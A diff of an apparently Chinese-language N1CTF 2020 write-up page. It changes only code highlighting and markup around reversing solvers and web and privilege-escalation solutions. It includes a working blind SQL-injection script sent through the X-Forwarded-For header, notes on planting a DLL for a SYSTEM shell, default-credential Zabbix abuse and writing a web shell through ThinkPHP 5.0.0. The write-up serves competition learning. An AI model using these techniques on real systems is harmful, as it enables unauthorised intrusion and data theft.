@@ -611,28 +611,29 @@ e = <span class="hljs-string">b""</span>
 print(a + <span class="hljs-string">b"_"</span> + b + <span class="hljs-string">b"_"</span> + c + <span class="hljs-string">b"_"</span> + d + <span class="hljs-string">b"_"</span> + e)</code></pre><h3 id="easy-apk"><a class="header-link" href="#easy-apk"></a>easy apk</h3>
 <p>ollvm，调试分析算法
 替换表的base64+aes_cbc</p>
-<pre class="hljs"><code>tbl = list(b<span class="hljs-string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-/"</span>)
-res = b<span class="hljs-string">"jZe3yJG3zJLHywu4otmZzwy/"</span>
-a = b<span class="hljs-string">""</span>
-for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(res), <span class="hljs-number">4</span>):
-    t = list(map(lambda x: tbl.index(x), list(res[i:i+<span class="hljs-number">4</span>])))
-    s = [<span class="hljs-number">0</span> for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>)]
+<pre class="hljs"><code>
+tbl = list(<span class="hljs-string">b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-/"</span>)
+res = <span class="hljs-string">b"jZe3yJG3zJLHywu4otmZzwy/"</span>
+a = <span class="hljs-string">b""</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(res), <span class="hljs-number">4</span>):
+    t = list(map(<span class="hljs-keyword">lambda</span> x: tbl.index(x), list(res[i:i+<span class="hljs-number">4</span>])))
+    s = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>)]
     s[<span class="hljs-number">0</span>] = ((t[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x3f</span>) &lt;&lt; <span class="hljs-number">2</span>) | ((t[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">3</span>)
     s[<span class="hljs-number">1</span>] = ((t[<span class="hljs-number">1</span>] &amp; <span class="hljs-number">0xf</span>) &lt;&lt; <span class="hljs-number">4</span>) | ((t[<span class="hljs-number">2</span>]&gt;&gt;<span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xf</span>)
     s[<span class="hljs-number">2</span>] = (t[<span class="hljs-number">3</span>] &amp; <span class="hljs-number">0x3f</span>) | ((t[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>)
     a += bytes(s)
-f1 = a[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]
+f1 = a[<span class="hljs-number">1</span>:<span class="hljs-number">-1</span>]
 
-<span class="hljs-built_in">k2</span> = b<span class="hljs-string">"17b87f9aae8933ef"</span>
-<span class="hljs-built_in">k1</span> = b<span class="hljs-string">"'17b87f9aae8933efn1ctf{}"</span>
-cipher = b<span class="hljs-string">"'7890123456789012"</span>
+k2 = <span class="hljs-string">b"17b87f9aae8933ef"</span>
+k1 = <span class="hljs-string">b"'17b87f9aae8933efn1ctf{}"</span>
+cipher = <span class="hljs-string">b"'7890123456789012"</span>
 res = bytes([<span class="hljs-number">0xA5</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x55</span>])
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-aes = AES.new(<span class="hljs-built_in">k1</span>, iv=<span class="hljs-built_in">k2</span>[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>], mode=AES.MODE_CBC)
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
+<span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad
+aes = AES.new(k1, iv=k2[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>], mode=AES.MODE_CBC)
 cipher = pad(cipher, <span class="hljs-number">16</span>)
 f2 = unpad(aes.decrypt(res), <span class="hljs-number">16</span>)[<span class="hljs-number">1</span>:]
-print(b<span class="hljs-string">"n1ctf{"</span> + f1 + f2 + b<span class="hljs-string">"}"</span>)</code></pre><h3 id="n1egg-in-fixed-camera"><a class="header-link" href="#n1egg-in-fixed-camera"></a>N1egg In Fixed Camera</h3>
+print(<span class="hljs-string">b"n1ctf{"</span> + f1 + f2 + <span class="hljs-string">b"}"</span>)</code></pre><h3 id="n1egg-in-fixed-camera"><a class="header-link" href="#n1egg-in-fixed-camera"></a>N1egg In Fixed Camera</h3>
 <p>彩蛋题，strings一下level0找到flag</p>
 <h3 id="easyre"><a class="header-link" href="#easyre"></a>easyre</h3>
 <p>虚拟机，用异常处理来控制路径，再就没啥了</p>
@@ -708,36 +709,37 @@ i = <span class="hljs-number">0</span>
 #     summ += flag[i]
 # <span class="hljs-keyword">print</span> summ</code></pre><h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
 <h3 id="signln"><a class="header-link" href="#signln"></a>Signln</h3>
-<pre class="hljs"><code>import requests
-import string
-import re
+<pre class="hljs"><code>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">import</span> re
 
 url = <span class="hljs-string">"http://101.32.205.189/?input=O%3A4%3A%22flag%22%3A2%3A%7Bs%3A2%3A%22ip%22%3Bs%3A9%3A%22callmecro%22%3Bs%3A5%3A%22check%22%3Bs%3A25%3A%22n1ctf20205bf75ab0a30dfc0c%22%3B%7D"</span>
 
-characters = string.printable[:-<span class="hljs-number">5</span>]
+characters = string.printable[:<span class="hljs-number">-5</span>]
 r = requests.get(url)
-<span class="hljs-keyword">if</span> <span class="hljs-string">"n1ctf{"</span> in r.text:
-    flag = <span class="hljs-string">""</span>.join(re.findall(r<span class="hljs-string">'n1ctf{.*}'</span>,r.text))
-    <span class="hljs-keyword">exit</span>(flag)
+<span class="hljs-keyword">if</span> <span class="hljs-string">"n1ctf{"</span> <span class="hljs-keyword">in</span> r.text:
+    flag = <span class="hljs-string">""</span>.join(re.findall(<span class="hljs-string">r'n1ctf{.*}'</span>,r.text))
+    exit(flag)
 
 sql =<span class="hljs-string">"select `key` from n1key"</span>
-<span class="hljs-keyword">exp</span> = <span class="hljs-string">"'||(select ip from n1ip where updatexml(1,concat('~',(select if(ascii(substring((%s),%d,1))=%d,'n1ctf','callmecro')),'~'),3))||'"</span>
+exp = <span class="hljs-string">"'||(select ip from n1ip where updatexml(1,concat('~',(select if(ascii(substring((%s),%d,1))=%d,'n1ctf','callmecro')),'~'),3))||'"</span>
 
 res = <span class="hljs-string">""</span>
 
-<span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):
-    flag = True
-    <span class="hljs-keyword">for</span> char in characters:
-        payload = <span class="hljs-keyword">exp</span> % (sql, i, <span class="hljs-keyword">ord</span>(char))
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):
+    flag = <span class="hljs-keyword">True</span>
+    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> characters:
+        payload = exp % (sql, i, ord(char))
         <span class="hljs-comment">#payload = exp</span>
         headers = {
             <span class="hljs-string">"X-Forwarded-For"</span>:payload
         }
         r = requests.get(url,headers=headers)
-        <span class="hljs-keyword">if</span> <span class="hljs-string">'welcome to n1ctf2020&lt;'</span> in r.text:
+        <span class="hljs-keyword">if</span> <span class="hljs-string">'welcome to n1ctf2020&lt;'</span> <span class="hljs-keyword">in</span> r.text:
             res += char
-            <span class="hljs-keyword">print</span>(res)
-            flag = False
+            print(res)
+            flag = <span class="hljs-keyword">False</span>
             <span class="hljs-keyword">break</span>
     <span class="hljs-keyword">if</span> flag:
         <span class="hljs-keyword">break</span>
@@ -751,12 +753,12 @@ res = <span class="hljs-string">""</span>
 <p>用usodllloader，写个自己的WindowsCoreDeviceInfo.dll，CreateFile的时候带上FILE_FLAG_BACKUP_SEMANTICS，直接写入system32文件夹。</p>
 <p>触发加载直接得到system的shell。</p>
 <h3 id="zabbix_fun"><a class="header-link" href="#zabbix_fun"></a>zabbix_fun</h3>
-<p>首先<code>Admin</code> <code>zabbix</code>登录。查看下agent的ip地址
-<img src="https://i.imgur.com/0V2kMt2.png" alt="">
-之后配置host，使能zbx
-<img src="https://i.imgur.com/N35vcMr.png" alt="">
-再用监控项(item)读文件就行了
-<img src="https://i.imgur.com/x2Bzi9J.png" alt=""></p>
+<p>首先<code>Admin</code> <code>zabbix</code>登录。查看下agent的ip地址</p>
+<p class="img-container"><img src="https://i.imgur.com/0V2kMt2.png" alt=""></p>
+<p>之后配置host，使能zbx</p>
+<p class="img-container"><img src="https://i.imgur.com/N35vcMr.png" alt=""></p>
+<p>再用监控项(item)读文件就行了</p>
+<p class="img-container"><img src="https://i.imgur.com/x2Bzi9J.png" alt=""></p>
 <h3 id="easy_tp5"><a class="header-link" href="#easy_tp5"></a>easy_tp5</h3>
 <p>发现tp版本是5.0.0，存在RCE的payload，但是由于open_basedir的设置和disabled_functions，导致了无法执行命令。</p>
 <p>所以思路就是往web目录下面写一个自己的shell，这样就可以逃出这个漏洞的限制，找到了Build类的module方法</p>
